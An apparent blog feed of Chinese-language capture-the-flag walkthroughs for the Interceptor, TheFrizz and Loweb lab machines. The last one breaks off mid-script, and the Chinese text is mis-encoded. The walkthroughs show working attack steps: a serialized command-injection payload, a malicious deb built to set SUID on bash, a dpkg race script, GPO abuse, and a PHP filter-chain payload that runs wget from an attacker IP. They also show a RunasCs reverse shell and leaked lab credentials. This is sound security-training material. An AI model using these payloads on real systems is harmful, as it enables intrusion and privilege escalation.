æ¥ä¸‹æ¥æŸ¥çœ‹ååºåˆ—åŒ–éƒ¨åˆ†ï¼Œæ£€æŸ¥IPåªè¦åˆæ³•æˆ–è€…å­˜åœ¨åˆ†å·å°±è¡Œ\nfunction validate() {\rif (!$this-\u0026gt;isValid) {\rif (filter_var($this-\u0026gt;ipAddress, FILTER_VALIDATE_IP) || strpos($this-\u0026gt;ipAddress, \u0026#34;;\u0026#34;) !== false) {\r$this-\u0026gt;isValid = True;\r}\r}\r$this-\u0026gt;ping();\r} å› æ­¤å¯ä»¥å¦‚ä¸‹æ„é€ \n\u0026lt;?php\rclass pingTest {\rpublic $ipAddress = \u0026#34;127.0.0.1|ls\u0026#34;;\rpublic $isValid = True;\rpublic $output = \u0026#34;\u0026#34;;\r}\recho urlencode(serialize(new pingTest())); æ‹¿åˆ°www-dataçš„åå¼¹Shell\nOwn Vincent #\ræŸ¥çœ‹åˆ°å­˜åœ¨å¦å¤–ä¸‰ä¸ªç”¨æˆ·\næŸ¥çœ‹wp-config.php\n/** Database username */\rdefine( \u0026#39;DB_USER\u0026#39;, \u0026#39;wpuser\u0026#39; );\r/** Database password */\rdefine( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;Lg:80/f,3\u0026gt;g+\u0026#39; ); æ•°æ®åº“ä¸­å¹¶æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿ï¼Œä¸è¿‡è¿™ä¸ªå¯†ç å¯ä»¥å°è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¯†ç å¤ç”¨çš„é—®é¢˜ã€‚\nåˆšå¥½å¯ä»¥ç™»å½•åˆ°Vincentçš„ftpæœåŠ¡\nä¸èƒ½ç›´æ¥ä¸Šä¼ SSHå¯†é’¥ï¼Œè¿™é‡Œåªèƒ½é€šè¿‡www-dataæ¥åˆ‡æ¢ç”¨æˆ·\nOwn ftpuser #\ræŸ¥çœ‹åˆ°vincentç›®å½•ä¸‹æœ‰ä¸€ä¸ª**.mozilla**ç›®å½•ï¼Œå¹¶ä¸”æœ‰å¾ˆå¤šæ•°æ®åº“æ–‡ä»¶\nåˆ©ç”¨å·¥å…·ï¼šblackunixteam/firefox_decrypt\næ‹¿åˆ°å¯†ç å°è¯•ç™»å½•å…¶ä»–çš„ç”¨æˆ·\nåˆšå¥½å¯ä»¥åˆ‡æ¢åˆ°ftpuserä¸Š\nRoot #\ræŸ¥çœ‹ftpuserçš„ç‰¹æ®Šå‘½ä»¤\nftpuser@debian:~$ sudo -l\rsudo -l\rMatching Defaults entries for ftpuser on debian:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\ruse_pty\rUser ftpuser may run the following commands on debian:\r(ALL : ALL) NOPASSWD: /usr/bin/installer\rftpuser@debian:~$ cat /usr/bin/installer\rcat /usr/bin/installer\r#!/bin/bash\r/usr/bin/apt-get install -y curl\r/usr/bin/wget --no-check-certificate -O /tmp/monitoring-agent.deb https://monitoring-secure.com/monitoring-agent.deb\r/usr/bin/dpkg -i /tmp/monitoring-agent.deb\r/bin/rm -rf /tmp/monitoring-agent.deb å¯ä»¥çœ‹åˆ°ï¼Œä¸‹è½½åˆ°debåŒ…ä¹‹åè¿›è¡Œå®‰è£…ï¼Œéšååˆç«‹å³åˆ é™¤ï¼Œè¿™é‡Œå¯ä»¥å°è¯•æ—¶é—´ç«äº‰ï¼Œé€šè¿‡dpkgè¿›è¡Œææƒ\ndpkg | GTFOBins éœ€è¦æå‰å®‰è£…fpm\ngem install fpm ç„¶ååˆ¶ä½œæ¶æ„debä¸Šä¼ ä¸Šå»\n[root@kali] /home/kali/Interceptor â¯ TF=$(mktemp -d)\r[root@kali] /home/kali/Interceptor â¯ echo \u0026#39;chmod u+s /bin/bash\u0026#39; \u0026gt; $TF/x.sh\r[root@kali] /home/kali/Interceptor â¯ fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF è¿™é‡Œæˆ‘å¼€äº†ä¸¤ä¸ªftpuserçš„ç»ˆç«¯ï¼Œå¯ä»¥å†å¼¹ä¸€ä¸ªshell\nåˆ†åˆ«è¿è¡Œ\nsudo /usr/bin/installer è¿˜æœ‰\nftpuser@debian:/tmp$ cat poc.sh\rcat poc.sh\r#!/bin/bash\rfor i in {1..10000}\rdo\rcp /tmp/x_1.0_all.deb /tmp/monitoring-agent.deb\rdone\rftpuser@debian:/tmp$ bash poc.sh\rbash poc.sh æœ€åæˆåŠŸæ‹¿åˆ°rootæƒé™\nSummary #\rUserï¼šwpscanæ‰«åˆ°è°ƒè¯•æ—¥å¿—ï¼Œæ ¹æ®æ’ä»¶æŸ¥æ‰¾åˆ°ç”¨æˆ·æ•°æ®ï¼Œè¿›è€Œç™»å½•åˆ°fpingè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‹¿åˆ°www-dataã€‚æŸ¥çœ‹åˆ°wp-configçš„å¯†ç ï¼Œå­˜åœ¨å¯†ç å¤ç”¨ï¼Œæ‹¿åˆ°vincentã€‚é€šè¿‡è§£å¯†vincentç›®å½•ä¸‹çš„firefoxç”¨æˆ·æ•°æ®ï¼Œæ‹¿åˆ°äº†ftpuseræƒé™ã€‚\nRootï¼šé€šè¿‡æ—¶é—´ç«äº‰ï¼Œæ¶æ„è¦†ç›–debåŒ…ï¼Œç„¶åé€šè¿‡dpkgè¿›è¡Œææƒã€‚\n","date":"2025-03-21","externalUrl":null,"permalink":"/posts/2025/03/vulnvm-interceptor/","section":"Posts","summary":"","title":"VulnVM-Interceptor","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali/TheFrizz â¯ nmap thefrizz.htb -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH for_Windows_9.5 (protocol 2.0)\r53/tcp open domain Simple DNS Plus\r80/tcp open http Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)\r|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/\r|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped å°†frizz.htbæ·»åŠ åˆ°**/etc/hosts**\nå°†frizzdc.frizz.htbæ·»åŠ åˆ°**/etc/hosts**\nå‘ç°æ˜¯ä¸€ä¸ªGibbonæœåŠ¡ï¼Œç‰ˆæœ¬å·æ˜¯25.0.0\nCVE-2023-45878 #\rusd-2023-0025 - usd HeroLab ç»è¿‡å°è¯•å¦‚ä¸‹å‘åŒ…\nç„¶åå³å¯è®¿é—®asdf.phpè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nè¿™é‡Œæˆ‘å°è¯•è¿‡åå¼¹Shellï¼Œå¯ä»¥å†™ä¸€ä¸ªMeterpreterã€‚\né€šè¿‡dirå¯ä»¥çœ‹åˆ°å½“å‰ç›®å½•å­˜åœ¨ä¸€ä¸ªconfig.php\nhttp://frizzdc.frizz.htb/Gibbon-LMS/asdf.php?cmd=type config.php å¾—åˆ°ä¸€ä¸ªæ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç \n\u0026lt;?php\r$databaseServer = \u0026#39;localhost\u0026#39;;\r$databaseUsername = \u0026#39;MrGibbonsDB\u0026#39;;\r$databasePassword = \u0026#39;MisterGibbs!Parrot!?1\u0026#39;;\r$databaseName = \u0026#39;gibbon\u0026#39;; å°è¯•è¿›å…¥æ•°æ®åº“çœ‹çœ‹ä¿¡æ¯\n.\\mysql.exe -u MrGibbonsDB -p\u0026#34;MisterGibbs!Parrot!?1\u0026#34; -e \u0026#34;show databases;\u0026#34; .\\mysql.exe -u MrGibbonsDB -p\u0026#34;MisterGibbs!Parrot!?1\u0026#34; -e \u0026#34;USE gibbon; SELECT * FROM gibbonperson;\u0026#34; -E C:\\xampp\\mysql\\bin\u0026gt;.\\mysql.exe -u MrGibbonsDB -p\u0026#34;MisterGibbs!Parrot!?1\u0026#34; -e \u0026#34;USE gibbon; SELECT * FROM gibbonperson;\u0026#34; -E .\\mysql.exe -u MrGibbonsDB -p\u0026#34;MisterGibbs!Parrot!?1\u0026#34; -e \u0026#34;USE gibbon; SELECT * FROM gibbonperson;\u0026#34; -E *************************** 1. row *************************** gibbonPersonID: 0000000001 title: Ms. surname: Frizzle firstName: Fiona preferredName: Fiona officialName: Fiona Frizzle nameInCharacters: gender: Unspecified username: f.frizzle passwordStrong: 067f746faca44f170c6cd9d7c4bdac6bcxxxxxxxxxxxxxxxxxxxxxx passwordStrongSalt: /aACFhikmNxxxxxxxxxx passwordForceReset: N\rstatus: Full\rcanLogin: Y\rgibbonRoleIDPrimary: 001\rgibbonRoleIDAll: 001\rdob: NULL\remail: f.frizzle@frizz.htb\remailAlternate: NULL\rimage_240: NULL\rlastIPAddress: ::1\rlastTimestamp: 2024-10-29 09:28:59\rlastFailIPAddress: 10.10.16.26\rlastFailTimestamp: 2025-03-17 08:29:30\rfailCount: 11\raddress1: address1District: address1Country: address2: Crack Passwd #\rå¾—åˆ°äº†å¯†ç hashä»¥åŠåŠ å¯†çš„ç›ï¼ŒåŠ å¯†æ–¹å¼åº”è¯¥æ˜¯SHA-256\næ³¨æ„ï¼ï¼ï¼ï¼\nè¿™é‡Œä½¿ç”¨johnæ¥è¿›è¡Œçˆ†ç ´ï¼Œæ³¨æ„å“ˆå¸Œæ ¼å¼\n[root@kali] /home/kali/TheFrizz â¯ john --format=dynamic=\u0026#39;sha256($s.$p)\u0026#39; --wordlist=/usr/share/wordlists/rockyou.txt hash.txt â\rUsing default input encoding: UTF-8\rLoaded 1 password hash (dynamic=sha256($s.$p) [128/128 AVX 4x])\rWarning: no OpenMP support for this hash type, consider --fork=4\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rxxxxxxxxxxxxxx (?) ç»è¿‡éªŒè¯ï¼Œå¯†ç æ˜¯æ­£ç¡®çš„\nUnexpected User #\rè¿™é‡Œæ— æ³•ç›´æ¥é€šè¿‡å¯†ç ç™»å½•åˆ°Evil-winrm\nå°è¯•é€šè¿‡Kerberosè¯·æ±‚ç¥¨æ®ï¼Œç„¶åå†å°è¯•evil-Winrmçš„ç¥¨æ®ç™»å½•\n[root@kali] /home/kali/TheFrizz â¯ ntpdate frizzdc.frizz.htb [root@kali] /home/kali/TheFrizz â¯ impacket-getTGT frizz.htb/\u0026#39;f.frizzle\u0026#39;:\u0026#39;xxxxxxxxxxxxx\u0026#39; -dc-ip frizzdc.frizz.htb [*] Saving ticket in f.frizzle.ccache\r[root@kali] /home/kali/TheFrizz â¯ export KRB5CCNAME=f.frizzle.ccache å¦‚æœé‡åˆ°ä¸Šé¢çš„æƒ…å†µğŸ‘†ï¼Œè¯·å°è¯•å°†VPNæ¢åˆ°US - Release Arenaï¼Œå½“ç„¶åˆ‡æ¢äº†å°±ä¼šå¾ˆå¡ã€‚ã€‚ã€‚\nä¹‹åè¿™ä¸ªæ–¹å¼è¢«ä¿®è¡¥äº†ï¼Œ5985ç«¯å£è¢«å…³é—­æ‰ã€‚\nExpected User #\rè¿™é‡Œæœ‰ä¸€ä¸ªå·¨å¤§çš„å‘ï¼Œ/etc/hostså¿…é¡»å¦‚ä¸‹è®¾ç½®ï¼Œå…·ä½“çš„ä¸‹é¢è¯´\n10.10.11.60 frizzdc.frizz.htb frizz.htb ä¿®æ”¹**/etc/krb5.conf**ï¼Œè¿™ä¸ªæ˜¯Kerberosçš„é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼ŒKerberos å®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨è¯¥é…ç½®ä¸ Kerberos è®¤è¯æœåŠ¡å™¨è¿›è¡Œé€šä¿¡\n[domain_realm]\r.frizz.htb = FRIZZ.HTB\rfrizz.htb = FRIZZ.HTB\r[libdefaults]\rdefault_realm = FRIZZ.HTB\rdns_lookup_realm = false\rdns_lookup_kdc = true\rticket_lifetime = 24h\rforwardable = true\r[realms]\rFRIZZ.HTB = {\rkdc = FRIZZDC.FRIZZ.HTB\radmin_server = FRIZZDC.FRIZZ.HTB\rdefault_domain = FRIZZ.HTB\r} ä½¿ç”¨kinitè·å–ç¥¨æ®ï¼Œä¹‹åå¯ä»¥ä½¿ç”¨klistæŸ¥çœ‹æ˜¯å¦æˆåŠŸ\n[root@kali] ~kali/TheFrizz â¯ kinit f.frizzle@FRIZZ.HTB ç„¶åä½¿ç”¨sshç™»å½•ï¼Œä½¿ç”¨**-Kå‚æ•°é€šè¿‡GSSAPI**è®¤è¯ï¼Œä¾¿èƒ½æˆåŠŸè¿æ¥ã€‚\n[root@kali] ~kali/TheFrizz â¯ ssh f.frizzle@frizz.htb -K Attention #\rä»¥ä¸‹å†…å®¹å¯èƒ½ä¼šæœ‰æ‰€é”™è¯¯ï¼Œæœ›è¯»è€…èƒ½æŒ‡æ­£ğŸ¤”\nä¸Šé¢çš„**/etc/hostsé‡Œçš„åŸŸåå¿…é¡»ååˆ†ä¸¥æ ¼çš„æŒ‰ç…§é¡ºåºæ’åˆ—ï¼Œå¿…é¡»æ˜¯frizzdc**åœ¨æœ€å‰é¢ï¼Œä¼šè¢«ä¼˜å…ˆè§£æ\nKerberos çš„åŸŸåè§£æå’Œè®¤è¯ç¡®å®ä¾èµ–äºé…ç½®æ–‡ä»¶ä¸­çš„é¡ºåºå’Œ /etc/hosts æ–‡ä»¶çš„æ­£ç¡®é…ç½®ã€‚é”™è¯¯çš„åŸŸåè§£æä¼šå¯¼è‡´ KDC æ— æ³•æ­£ç¡®æ‰¾åˆ°æˆ–éªŒè¯ç›®æ ‡ä¸»æœºï¼Œä»è€Œå¯¼è‡´ Kerberos æˆ– GSSAPI è®¤è¯å¤±è´¥ã€‚å› æ­¤ï¼Œç¡®ä¿ /etc/hosts ä¸­çš„åŸŸåä¸ krb5.conf é…ç½®ä¸­çš„åŸŸåä¸€è‡´ï¼Œå¹¶ä¸”æ²¡æœ‰å†²çªï¼Œæ˜¯è‡³å…³é‡è¦çš„ã€‚\nå¦‚æœåœ¨ /etc/hosts æ–‡ä»¶ä¸­æ·»åŠ äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„ thefrizz.htbï¼Œå¹¶ä¸”è¿™ä¸ªåŸŸåå¹¶ä¸å±äºç›®æ ‡ä¸»æœºçš„å®é™…åŸŸåï¼Œé‚£ä¹ˆå®ƒå¯èƒ½ä¼šå½±å“ GSSAPI å’Œ Kerberos è®¤è¯ï¼Œç‰¹åˆ«æ˜¯å½“ä½ ä½¿ç”¨ Kerberos æ—¶ï¼Œè®¤è¯è¿‡ç¨‹ä¾èµ–äºåŸŸåçš„æ­£ç¡®åŒ¹é…ã€‚\nå…·ä½“çš„å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼Œå¦‚æœæ˜¯å…¶ä»–åŸŸåè¢«ä¼˜å…ˆè®¾ç½®çš„æƒ…å†µï¼Œä½ å¯ä»¥ä½¿ç”¨ssh -vvvå‚æ•°æŸ¥çœ‹åˆ°è¿™ä¸ªé”™è¯¯\nå¦‚æœä½ å°†ä¸€ä¸ªä¸å­˜åœ¨çš„åŸŸåï¼ˆä¾‹å¦‚ thefrizz.htbï¼‰æ”¾åœ¨ /etc/hosts ä¸­å¹¶æŒ‡å‘é”™è¯¯çš„ IPï¼Œé‚£ä¹ˆ Kerberos å®¢æˆ·ç«¯å°±ä¼šä½¿ç”¨è¿™ä¸ªé”™è¯¯çš„ä¸»æœºåè¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¯¼è‡´ Server not found in Kerberos database æˆ–ç±»ä¼¼é”™è¯¯ã€‚\nå¦‚æœå°†frizzdc.frizz.htbæ”¾åˆ°æœ€å‰é¢çš„è¯ï¼ŒæŸ¥çœ‹è¯¦ç»†è¾“å‡ºï¼Œå¯ä»¥çœ‹åˆ°æ˜¯è®¤è¯æˆåŠŸã€‚\nå‡ºäºä¸ªäººä¹ æƒ¯ï¼Œæˆ‘ä¼šå°†æœºå™¨åç§°æ·»åŠ åˆ°**/etc/hosts**ï¼Œæ²¡æƒ³åˆ°ä¼šåœ¨è¿™é‡Œå‡ºé—®é¢˜ï¼Œé•¿çŸ¥è¯†äº†ã€‚\nPrivilege Escalation #\rå…ˆä½¿ç”¨bloodhoundåˆ†æä¸€æ³¢\n[root@kali] /home/kali/TheFrizz â¯ bloodhound-python -u \u0026#39;f.frizzle\u0026#39; -p \u0026#39;xxxxxxxxx\u0026#39; -d frizz.htb -dc frizzdc.frizz.htb -ns 10.xx.xx.xx -c all --zip å½“å‰çš„f.frizzleç”¨æˆ·å¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„æƒé™ï¼Œå› æ­¤å°è¯•æŸ¥çœ‹åŸŸå†…çš„å…¶ä»–ç”¨æˆ·\nå¯ä»¥çœ‹åˆ°m.schoolbusè¿™ä¸ªç”¨æˆ·æœ‰è¾ƒé«˜æƒé™ï¼Œä½†æ˜¯å½“å‰çš„f.frizzleå¯¹å…¶æ²¡æœ‰æ§åˆ¶æƒé™ã€‚\nåœ¨å›æ”¶ç«™çš„ç›®å½•ä¸­ï¼Œå‘ç°æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼ŒSIDæ˜¯f.frizzleçš„\nè¿™é‡Œä¸å¥½ç›´æ¥ä¼ è¾“ï¼Œæˆ‘æ˜¯ç”¨meterpreterè¿›è¡Œä¼ è¾“çš„\n[root@kali] /home/kali â¯ 7z x \u0026#39;$RE2XMEG.7z\u0026#39; -o./extracted åœ¨è¿™é‡Œåˆšå¥½æ‹¿åˆ°äº†ä¸€ä¸²å¯†ç ï¼Œç»è¿‡æµ‹éªŒå°±æ˜¯m.schoolbusçš„å¯†ç ã€‚\nåŒæ ·çš„æ­¥éª¤ç™»å½•åˆ°M.schoolbus\næ³¨æ„ï¼ï¼ï¼ï¼\nè¿™ä¸ªææƒçš„é¢„æœŸåº”è¯¥æ˜¯é€šè¿‡M.schoolbusæ¥è¿›è¡ŒGPO abuseï¼Œä½†æ˜¯æˆ‘çš„Bloodhoundå’ŒSharphoundéƒ½æ²¡æœ‰å‘ç°è¿™æƒé™ã€‚å› æ­¤ä»¥ä¸‹ä»…ä»…ä½œä¸ºå‚è€ƒã€‚\nantonioCoco/RunasCs: RunasCs - Csharp and open version of windows builtin runas.exe\nbyronkg/SharpGPOAbuse: Precompiled executable\nPS C:\\Temp\u0026gt; New-GPO -Name pain | New-GPLink -Target \u0026#34;OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB\u0026#34; -LinkEnabled Yes\rGpoId : f97a73ca-2745-4375-857c-4ee8fe1b0256\rDisplayName : pain\rEnabled : True\rEnforced : False\rTarget : OU=Domain Controllers,DC=frizz,DC=htb\rOrder : 2 åˆ›å»ºåä¸º pain çš„ GPOã€‚\nå°†å…¶é“¾æ¥åˆ° FRIZZ.HTB åŸŸä¸­çš„ DOMAIN CONTROLLERS ç»„ç»‡å•å…ƒã€‚\nç¡®ä¿è¯¥é“¾æ¥å·²å¯ç”¨ï¼Œä½¿è¯¥ GPO åœ¨è¯¥ OU å†…çš„æ‰€æœ‰å¯¹è±¡ï¼ˆå³åŸŸæ§åˆ¶å™¨ï¼‰ä¸Šç”Ÿæ•ˆã€‚\nPS C:\\Temp\u0026gt; Get-GPO -All | Select DisplayName,Id DisplayName Id\r----------- --\rDefault Domain Policy 31b2f340-016d-11d2-945f-00c04fb984f9\rDefault Domain Controllers Policy 6ac1786c-016f-11d2-945f-00c04fb984f9\rpain 8f13d279-2073-4d35-be51-f6adcf66f25c\rPS C:\\Temp\u0026gt; .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName pain [+] Domain = frizz.htb\r[+] Domain Controller = frizzdc.frizz.htb\r[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb\r[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106\r[+] GUID of \u0026#34;pain\u0026#34; is: {8F13D279-2073-4D35-BE51-F6ADCF66F25C}\r[+] Creating file \\\\frizz.htb\\SysVol\\frizz.htb\\Policies\\{8F13D279-2073-4D35-BE51-F6ADCF66F25C}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\r[+] versionNumber attribute changed successfully\r[+] The version number in GPT.ini was increased successfully.\r[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\r[+] Done! æ¥ä¸‹æ¥åˆ·æ–°GPO\nPS C:\\Temp\u0026gt; gpupdate /force Updating policy...\rComputer Policy update has completed successfully.\rUser Policy update has completed successfully. æŸ¥çœ‹æ˜¯å¦å·²ç»åŠ å…¥äº†ç®¡ç†å‘˜ç»„\nPS C:\\Temp\u0026gt; net localgroup Administrators Alias name Administrators\rComment Administrators have complete and unrestricted access to the computer/domain\rMembers\r-------------------------------------------------------------------------------\rAdministrator\rM.SchoolBus\rThe command completed successfully. å¯ä»¥çœ‹åˆ°å°½ç®¡å·²ç»åœ¨ç®¡ç†å‘˜ç»„ï¼Œä½†æ˜¯æ— æ³•è¯»å–åˆ°root.txt\nå› ä¸ºéœ€è¦é‡æ–°ç™»å½•ï¼Œä½†æ˜¯è¿™é‡Œå¦‚æœç›´æ¥exité€€å‡ºï¼Œæœ‰ä¸€å®šæ¦‚ç‡å†ä¹Ÿè¿ä¸ä¸ŠPSï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ç”¨RunasCSæ¥å¼€å¯å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œé—´æ¥åˆ·æ–°ã€‚\nPS C:\\Temp\u0026gt; .\\RunasCs.exe M.SchoolBus !suBcig@MehTed!R cmd.exe -r 10.10.xx.xx:8888\r[+] Running in session 0 with process function CreateProcessWithLogonW()\r[+] Using Station\\Desktop: Service-0x0-67acc$\\Default\r[+] Async process \u0026#39;C:\\Windows\\system32\\cmd.exe\u0026#39; with pid 3644 created in background. Summary #\rUserï¼šé€šè¿‡Gibbonåˆ›å»ºæ¶æ„PHPæ–‡ä»¶æ¥å‘½ä»¤æ‰§è¡Œï¼Œåœ¨ç›®å½•ä¸‹å‘ç°æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ã€‚è¿›å…¥åˆ°æ•°æ®åº“ä¸­æ‹¿åˆ°f.frizzleçš„å¯†ç å“ˆå¸Œï¼Œç ´è§£åè·å–åˆ°ç¥¨æ®ï¼Œé€šè¿‡sshç™»å½•æ‹¿åˆ°userã€‚\nRootï¼šè¿™é‡Œæˆ‘å°è¯•è¿‡å¾ˆå¤šæ–¹æ³•ï¼Œéƒ½æ— æ³•æŸ¥çœ‹åˆ°WriteGPOlinkè¿™ä¸ªæƒé™ï¼Œæˆ–è®¸æ˜¯æœºå™¨çš„é—®é¢˜ã€‚å…·ä½“æµç¨‹å°±æ˜¯é€šè¿‡GPOæ¥å°†M.schoolbusæ·»åŠ åˆ°ç®¡ç†å‘˜ç»„é‡Œé¢ã€‚\næœºå™¨çš„æ€è·¯å¾ˆå¥½ï¼Œä½†æ˜¯å®é™…æ‰“èµ·æ¥å¾ˆéš¾å—ã€‚å¤ªé—æ†¾äº†ã€‚\n","date":"2025-03-17","externalUrl":null,"permalink":"/posts/2025/03/htb-thefrizz/","section":"Posts","summary":"","title":"HTB-TheFrizz","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Low Nmap #\r[root@kali] /home/kali/Loweb â¯ nmap 192.168.56.122 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)\r|_ 256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.62 (Debian) Gobuster #\r[root@kali] /home/kali/Loweb â¯ gobuster dir -u http://192.168.56.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.122\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/library (Status: 301) [Size: 318] [--\u0026gt; http://192.168.56.122/library/]\r/server-status (Status: 403) [Size: 279]\rProgress: 220560 / 220561 (100.00%)\r===============================================================\rFinished\r===============================================================\r[root@kali] /home/kali/Loweb â¯ gobuster dir -u http://192.168.56.122/library -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.122/library\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 279]\r/.html (Status: 403) [Size: 279]\r/index.html (Status: 200) [Size: 1068]\r/login (Status: 301) [Size: 324] [--\u0026gt; http://192.168.56.122/library/login/]\r/admin (Status: 301) [Size: 324] [--\u0026gt; http://192.168.56.122/library/admin/]\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== SQL Injection #\rè¿›å…¥ç™»å½•é¡µé¢ï¼Œç”¨æˆ·åå¤„å­˜åœ¨SQLæ³¨å…¥\nLFI #\ræ³¨æ„åˆ°URLä¸­æœ‰ä¸€ä¸ªlangå‚æ•°ï¼Œå°è¯•è¿›è¡Œæ–‡ä»¶åŒ…å«\nå­˜åœ¨r3dh4ckç”¨æˆ·ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç \nhttp://192.168.56.122/library/admin/index.php?lang=php://filter/convert.base64-encode/resource=../../../../../var/www/html/library/admin/index.php å¯ä»¥ç›´æ¥ä½¿ç”¨php filter chainsæ”»å‡»\nsynacktiv/php_filter_chain_generator æ³¨æ„ï¼ï¼ï¼ï¼ï¼\nè¿™é‡ŒURLä¸èƒ½å¤ªé•¿äº†ï¼Œè¦å°½é‡ç¼©çŸ­å‘½ä»¤çš„é•¿åº¦ã€‚\n[root@kali] /home/kali/Loweb/php_filter_chain_generator (main) â¯ python php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?= system(\u0026#34;wget 192.168.56.118/s\u0026#34;);?\u0026gt;\u0026#39; [root@kali] /home/kali/Loweb/php_filter_chain_generator (main) â¯ python php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?= system(\u0026#34;bash s\u0026#34;);?\u0026gt;\u0026#39; Own r3dh4ck #\ræŸ¥çœ‹linpeasï¼Œå‘ç°å­˜åœ¨r3dh4ckçš„å®šæ—¶ä»»åŠ¡\næŸ¥çœ‹**/opt/monitor.sh**\n#!/bin/bash\rLOGDIR=\u0026#34;/var/log/monitor\u0026#34;\rLOGFILE=\u0026#34;$LOGDIR/system_monitor_$(date +%Y%m%d%H%M%S).log\u0026#34;\rmkdir -p $LOGDIR\recho \u0026#34;=== Monitoring started: $(date) ===\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho \u0026#34;\u0026gt;\u0026gt; Open ports and associated processes:\u0026#34; \u0026gt;\u0026gt; $LOGFILE\rss -tulpn | grep LISTEN \u0026gt;\u0026gt; $LOGFILE 2\u0026gt;/dev/null\recho -e \u0026#34;\\n\u0026gt;\u0026gt; Currently connected users:\u0026#34; \u0026gt;\u0026gt; $LOGFILE\rwho \u0026gt;\u0026gt; $LOGFILE\recho -e \u0026#34;\\n\u0026gt;\u0026gt; System information:\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho \u0026#34;Hostname: $(hostname)\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho \u0026#34;Kernel version: $(uname -r)\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho \u0026#34;Uptime: $(uptime -p)\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho -e \u0026#34;\\n\u0026gt;\u0026gt; Generating simulated credentials for audit:\u0026#34; \u0026gt;\u0026gt; $LOGFILE\rSECRET_USER=\u0026#34;r3dh4ck\u0026#34;\rSECRET_PASS=\u0026#34;contraseÃ±aconÃ‘jeje\u0026#34; # Change this password for the future\recho \u0026#34;User: SECRET_USER\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho \u0026#34;Password: SECRET_PASS\u0026#34; \u0026gt;\u0026gt; $LOGFILE\recho -e \u0026#34;\\n\u0026gt;\u0026gt; Possible suspicious processes running:\u0026#34; \u0026gt;\u0026gt; $LOGFILE\rps aux | grep -i 